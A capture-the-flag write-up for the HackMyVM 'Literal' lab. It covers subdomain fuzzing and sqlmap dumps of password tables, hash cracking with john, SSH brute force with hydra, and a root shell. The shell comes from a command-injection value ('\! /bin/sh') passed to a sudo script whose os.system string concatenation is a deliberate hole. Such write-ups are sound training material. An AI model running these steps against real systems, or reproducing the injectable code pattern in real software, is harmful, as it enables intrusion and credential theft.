---
layout: post
title: "HackMyVM - Literal"
date: 2023-04-20 15:47:00 +0100
categories: hmv
tag: ["SQLI", "Python"]
---

Creator: [Lanz](https://hackmyvm.eu/profile/?user=Lanz)
Level: Easy
Release Date: 2023-04-20

## Scan

```bash
$ nmap -sV -sC -Pn -oA scans/Literal -p- 192.168.1.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 23:21 WEST
Nmap scan report for 192.168.1.16
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 30ca559468338b5042f4c2b5139966fe (RSA)
|   256 2db05e6b96bd0be314fbe0d058845085 (ECDSA)
|_  256 92d92a5d6f58db8556d60c9968b85964 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://blog.literal.hmv
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds
```

## Enumeration

### Find the Subdomain

```bash
$ curl http://192.168.1.16           
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://blog.literal.hmv">here</a>.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.1.16 Port 80</address>
</body></html>
```

#### FFuF

```bash
$ sudo ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://literal.hmv -H "Host: FUZZ.literal.hmv" -fs 757 -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://literal.hmv
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.literal.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 757
________________________________________________

[Status: 200, Size: 3325, Words: 337, Lines: 79, Duration: 22ms]
    * FUZZ: blog 
```

### Subdomain directory enumeration

```bash
$ gobuster dir -u http://blog.literal.hmv -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blog.literal.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/04/20 23:26:03 Starting gobuster in directory enumeration mode
===============================================================

/index.html           (Status: 200) [Size: 3325]
/images               (Status: 301) [Size: 321] [--> http://blog.literal.hmv/images/]
/.php                 (Status: 403) [Size: 281]
/.html                (Status: 403) [Size: 281]
/login.php            (Status: 200) [Size: 1893]
/register.php         (Status: 200) [Size: 2159]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 320] [--> http://blog.literal.hmv/fonts/]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/.html                (Status: 403) [Size: 281]
/.php                 (Status: 403) [Size: 281]
/server-status        (Status: 403) [Size: 281]
===============================================================
2023/04/20 23:30:49 Finished
===============================================================
```

## Website 

### Register and Login any account

<img src="https://drive.google.com/uc?id=1oyQGWmKfTKhtkt9RQ2qiwAWzA1S163BU"/>

<img src="https://drive.google.com/uc?id=1byfSNL5imgG3W6OTzYPMK7wn-_wtL7aH"/>

<img src="https://drive.google.com/uc?id=1i650AuuKBKbEzu6o4umUNWWNtyNQq__d"/>

## SQL Injection

* Query Request

```http
POST /next_projects_to_do.php HTTP/1.1
Host: blog.literal.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://blog.literal.hmv
Connection: close
Referer: http://blog.literal.hmv/next_projects_to_do.php
Cookie: PHPSESSID=vohaseqrtjdu0rnnaqsrg7li81
Upgrade-Insecure-Requests: 1

sentence-query=Done
```

### Look for SQL Injections

```bash
$ sqlmap -u "http://blog.literal.hmv/next_projects_to_do.php" --data "sentence-query=A*" -H "Cookie: PHPSESSID=vohaseqrtjdu0rnnaqsrg7li81" --batch -D blog -T users --dump
```

```
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| userid | username  | useremail                        | userpassword                                                 | usercreatedate      |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| 1      | test      | test@blog.literal.htb            | $2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma | 2023-04-07 17:21:47 |
| 2      | admin     | admin@blog.literal.htb           | $2y$10$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K | 2023-04-07 17:21:47 |
| 3      | carlos    | carlos@blog.literal.htb          | $2y$10$ikI1dN/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW | 2023-04-07 17:21:48 |
| 4      | freddy123 | freddy123@zeeli.moc              | $2y$10$yaf9nZ6UJkf8103R8rMdtOUC.vyZUek4vXVPas3CPOb4EK8I6eAUK | 2023-04-07 17:21:48 |
| 5      | jorg3_M   | jorg3_M@zeeli.moc                | $2y$10$lZ./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG | 2023-04-07 17:21:48 |
| 6      | aNdr3s1to | aNdr3s1to@puertonacional.ply     | $2y$10$F2Eh43xkXR/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm | 2023-04-07 17:21:48 |
| 7      | kitty     | kitty@estadodelarte.moc          | $2y$10$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW | 2023-04-07 17:21:48 |
| 8      | walter    | walter@forumtesting.literal.hmv  | $2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO | 2023-04-07 17:21:48 |
| 9      | estefy    | estefy@caselogic.moc             | $2y$10$hBB7HeTJYBAtdFn7Q4xzL.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa | 2023-04-07 17:21:48 |
| 10     | michael   | michael@without.you              | $2y$10$sCbKEWGgAUY6a2Y.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km | 2023-04-07 17:21:48 |
| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv | $2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO | 2023-04-07 17:21:48 |
| 12     | fel1x     | fel1x@without.you                | $2y$10$o06afYsuN8yk0yoA.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m | 2023-04-07 17:21:48 |
| 13     | kelsey    | kelsey@without.you               | $2y$10$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6. | 2023-04-07 17:21:48 |
| 14     | jtx       | jtx@tiempoaltiempo.hy            | $2y$10$jN5dt8syJ5cVrlpotOXibeNC/jvW0bn3z6FetbVU/CeFtKwhdhslC | 2023-04-07 17:21:48 |
| 15     | DRphil    | DRphil@alcaldia-tol.gob          | $2y$10$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC | 2023-04-07 17:21:48 |
| 16     | carm3N    | carm3N@estadodelarte.moc         | $2y$10$D7uF6dKbRfv8U/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW | 2023-04-07 17:21:48 |
| 17     | lanz      | lanz@literal.htb                 | $2y$10$PLGN5.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf..e | 2023-04-07 17:55:36 |
| 18     | adok      | adok@lol.com                     | $2y$10$nSoJuMvywaeuMhZ.cg1uFOomPiUcLtkW086Vne2HmuRsvC1uggtgO | 2023-04-20 22:24:23 |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
```


* NEW Subdomain: forumtesting.literal.hmv
* USERS: walter, r1ch4rd

## Subdomain (forumtesting.literal.hmv)

<img src="https://drive.google.com/uc?id=14Uw8D4snGjf1VWJZYJLqycHEL5BvBF2C"/>

### SQL Injection

```bash
sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" --batch --level 5 --risk 3 -D forumtesting -T forum_owner --dump
```

```bash
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| id | email                           | created    | password                                                                                                                         | username |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| 1  | carlos@forumtesting.literal.htb | 2022-02-12 | 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 | carlos   |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
```

### Crack Hash

```bash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 128/128 AVX 2x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
forum100889      (?)     
1g 0:00:00:02 DONE (2023-04-27 05:34) 0.4672g/s 3768Kp/s 3768Kc/s 3768KC/s foshiz1..formy6600
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

* Email: carlos@forumtesting.literal.htb
* Pass: forum******

## SSH 

```bash
$ hydra -l carlos -P dic 192.168.1.16 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-27 06:02:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:1/p:6), ~1 try per task
[DATA] attacking ssh://192.168.1.16:22/
[22][ssh] host: 192.168.1.16   login: carlos   password: ssh******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-27 06:02:37
```

```bash
$ ssh carlos@192.168.1.16
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-146-generic x86_64)

carlos@literal:~$ sudo -l
Matching Defaults entries for carlos on literal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on literal:
    (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *
carlos@literal:~$ 
```

## ROOT

```python
#!/usr/bin/python3

# Learning python3 to update my project status
## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P

'''
References:
* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
'''

import os
import sys
from datetime import date

# Functions ------------------------------------------------.
def execute_query(sql):
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")

# Query all rows
def query_all():
    sql = "SELECT * FROM projects;"
    execute_query(sql)

# Query row by ID
def query_by_id(arg_project_id):
    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
    execute_query(sql)

# Update database
def update_status(enddate, arg_project_id, arg_project_status):
    if enddate != 0:
        sql = f"UPDATE projects SET prodateend = '" + str(enddate) + "', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"
    else:
        sql = f"UPDATE projects SET prodateend = '2222-12-12', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"

    execute_query(sql)

# Main program
def main():
    # Fast validation
    try:
        arg_project_id = sys.argv[1]
    except:
        arg_project_id = ""

    try:
        arg_project_status = sys.argv[2]
    except:
        arg_project_status = ""

    if arg_project_id and arg_project_status: # To update
        # Avoid update by error
        if os.geteuid() == 0:
            array_status = ["Done", "Doing", "To do"]
            if arg_project_status in array_status:
                print("[+] Before update project (" + arg_project_id + ")\n")
                query_by_id(arg_project_id)

                if arg_project_status == 'Done':
                    update_status(date.today(), arg_project_id, arg_project_status)
                else:
                    update_status(0, arg_project_id, arg_project_status)
            else:
                print("Bro, avoid a fail: Done - Doing - To do")
                exit(1)

            print("\n[+] New status of project (" + arg_project_id + ")\n")
            query_by_id(arg_project_id)
        else:
            print("Ejejeeey, avoid mistakes!")
            exit(1)

    elif arg_project_id:
        query_by_id(arg_project_id)
    else:
        query_all()

# Variables ------------------------------------------------.
db_user = "carlos"
db_name = "blog"

# Main program
main()
```

### Execute command with 2 parameters

```bash
carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py '\! /bin/sh' Done
[+] Before update project (\! /bin/sh)

# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
